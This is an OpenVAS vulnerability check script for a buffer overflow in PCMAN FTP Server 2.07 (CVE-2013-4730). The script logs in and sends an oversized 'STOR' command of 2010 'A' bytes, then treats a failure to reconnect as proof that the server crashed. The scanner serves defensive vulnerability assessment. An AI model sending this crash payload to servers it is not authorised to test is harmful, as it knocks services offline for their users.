###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pcman_ftp_stor_buff_overflow_vuln.nasl 13499 2019-02-06 12:55:20Z cfischer $
#
# PCMAN FTP Server STOR Command Buffer Overflow vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803875");
  script_version("$Revision: 13499 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2013-4730");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 13:55:20 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-08-21 16:49:10 +0530 (Wed, 21 Aug 2013)");
  script_name("PCMAN FTP Server STOR Command Buffer Overflow vulnerability");

  script_tag(name:"summary", value:"This host is running PCMAN FTP server and is prone to buffer overflow
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted huge request in STOR command and check whether the application
  is crashed or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Flaw is due to an improper sanitation of user supplied input passed via the
  'STOR' command followed by '/../' parameter.");

  script_tag(name:"affected", value:"PCMAN FTP version 2.07, Other versions may also be affected.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to cause denial of
  service condition result in loss of availability for the application.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://1337day.com/exploit/21134");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27703");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013080160");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122883");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/pcmans/ftp/detected");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(!banner || "220 PCMan's FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220 PCMan's FTP Server" >!< banner){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

soc = open_sock_tcp(ftpPort);
if(!soc)
  exit(0);

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin){
  ftp_close(socket:soc);
  exit(0);
}

PAYLOAD = crap(data: "\x41", length:2010);

send(socket:soc, data:string("STOR ", PAYLOAD, '\r\n'));
ftp_close(socket:soc);

sleep(3);

soc = open_sock_tcp(ftpPort);
if(!soc){
  security_message(port:ftpPort);
  exit(0);
}

ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
ftp_close(socket:soc);
if(!ftplogin){
  security_message(port:ftpPort);
  exit(0);
}
